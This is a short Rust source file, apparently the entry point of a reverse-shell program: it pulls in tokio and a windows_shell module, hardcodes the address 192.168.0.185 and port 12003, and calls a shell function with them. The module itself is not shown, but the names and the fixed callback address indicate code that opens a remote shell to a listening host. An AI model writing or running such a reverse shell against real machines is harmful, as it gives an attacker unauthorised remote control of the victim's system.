extern crate tokio;

mod windows_shell;

fn main() {

    let ip = String::from("192.168.0.185");
    let port = String::from("12003");
    windows_shell::shell(ip, port);
}
